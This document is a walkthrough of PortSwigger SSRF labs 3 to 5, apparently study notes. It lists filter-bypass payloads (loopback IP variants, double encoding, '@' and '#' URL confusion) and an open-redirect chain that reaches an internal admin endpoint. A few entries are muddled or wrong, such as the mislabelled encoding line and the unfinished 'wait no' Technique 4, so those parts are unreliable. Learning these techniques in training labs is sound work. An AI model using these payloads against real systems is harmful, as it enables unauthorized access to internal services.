## Lab 3 — SSRF with Blacklist-Based Input Filter

**Lab:** https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

**Goal:** Bypass blacklist filter and access `http://localhost/admin` to delete `carlos`.

---

### What the Filter Blocks

The application blocks:
- `127.0.0.1`
- `localhost`
- `/admin`

### Bypass Techniques

**Bypass `127.0.0.1`:**

```
# Alternative IP representations of 127.0.0.1
http://2130706433/          → decimal representation
http://017700000001/        → octal representation
http://127.1/               → short form
http://127.0.1/             → variation
http://0/                   → resolves to 0.0.0.0 = localhost
http://0.0.0.0/             → same as localhost
http://[::1]/               → IPv6 localhost
http://[::]/ 	            → IPv6 any
http://spoofed.burpcollaborator.net/  → resolves to 127.0.0.1
```

**Bypass `localhost`:**

```
# Case variation
http://LOCALHOST/admin
http://LocalHost/admin
http://lOcAlHoSt/admin

# Double URL encode
http://127.0.0.1/    → works if only localhost is blocked

# Use IP alternatives above
http://127.1/admin
http://2130706433/admin
```

**Bypass `/admin`:**

```
# Double URL encode the a
http://127.1/%2561dmin     → %25 = encoded % so %2561 = %61 = a
http://127.1/ADMIN         → case variation
http://127.1/admin/        → trailing slash
http://127.1/./admin       → dot bypass
```

### Steps

**Step 1** — Try `stockApi=http://localhost/admin` → blocked

**Step 2** — Try IP bypass: `stockApi=http://127.1/admin` → if blocked

**Step 3** — Encode `/admin`: `stockApi=http://127.1/%2561dmin`

## Lab 4 — SSRF with Whitelist-Based Input Filter

**Lab:** https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

**Goal:** Bypass whitelist filter and access `http://localhost/admin` to delete `carlos`.

---

### What the Filter Allows

The application **only allows** URLs containing `stock.weliketoshop.net`.

### Bypass Techniques

The URL specification has features we can exploit to confuse the parser:

**Technique 1 — @ character (credentials in URL)**

```
https://expected-host@evil-host

# Example: filter checks for stock.weliketoshop.net
# But the actual host is localhost
http://stock.weliketoshop.net@localhost/admin
```

The `@` means "connect to `localhost` with username `stock.weliketoshop.net`". Filter sees `stock.weliketoshop.net` and passes it. Server connects to `localhost`.

**Technique 2 — # fragment**

```
http://localhost#stock.weliketoshop.net/admin
```

Filter sees `stock.weliketoshop.net` in the URL. `#` makes everything after it a fragment — only the part before `#` is the actual host.

**Technique 3 — Subdomain of evil host**

```
http://stock.weliketoshop.net.evil-host.com/admin
```

Filter sees it starts with `stock.weliketoshop.net` → passes. But DNS resolves to `evil-host.com`.

**Technique 4 — URL encoding**

```
# Double encode @ symbol
http://localhost%2523@stock.weliketoshop.net/admin
# %25 = % so %2523 = %23 = # ... wait no
# %2540 = @ (double encoded)
```

**Combine techniques:**

```
# Use @ to embed whitelist domain as credentials
http://stock.weliketoshop.net@localhost/admin

# URL encode the @ to bypass @ filtering
http://stock.weliketoshop.net%40localhost/admin

# Double encode
http://stock.weliketoshop.net%2540localhost/admin
```

### Steps

**Step 1** — Try direct: `stockApi=http://localhost/admin` → blocked

**Step 2** — Try @ bypass: `stockApi=http://stock.weliketoshop.net@localhost/admin`

**Step 3** — Try with # : `stockApi=http://localhost#@stock.weliketoshop.net/admin`

**Step 4** — Try double-encoded @:
```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

## Lab 5 — SSRF with Filter Bypass via Open Redirection

**Lab:** https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirect

**Goal:** Use an open redirect to bypass the filter and access `http://192.168.0.12:8080/admin` to delete `carlos`.

---

### What the Filter Does

The application only allows `stockApi` URLs that point to the **local application itself** — not to arbitrary hosts.

### The Open Redirect

The application has an open redirect vulnerability in the next product feature:

```
/product/nextProduct?currentProductId=1&path=http://evil.com
```

This redirects to whatever URL is in `path`.

### How to Chain SSRF + Open Redirect

```
1. stockApi points to the LOCAL app (passes filter)
2. Local app has open redirect
3. Open redirect sends request to INTERNAL IP
4. Internal admin is reached

stockApi=http://SITE/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

Filter checks: `http://SITE/product/...` → allowed (it's the local site)
Server follows the open redirect → ends up at `192.168.0.12:8080/admin`

### Steps

**Step 1** — Find the open redirect. Browse the site and look for next/previous product links:

```
/product/nextProduct?currentProductId=1&path=/product?productId=2
```

The `path` parameter controls where you go.

## Filter Bypass Summary

| Filter Type | What It Blocks | Bypass Method |
|-------------|---------------|---------------|
| Blacklist | `127.0.0.1`, `localhost`, `/admin` | Alt IPs (`127.1`), encoding (`%2561dmin`) |
| Whitelist | Only allows specific domain | `@` injection, `#` fragment, double encoding |
| Domain restriction | Only local app | Open redirect chain |
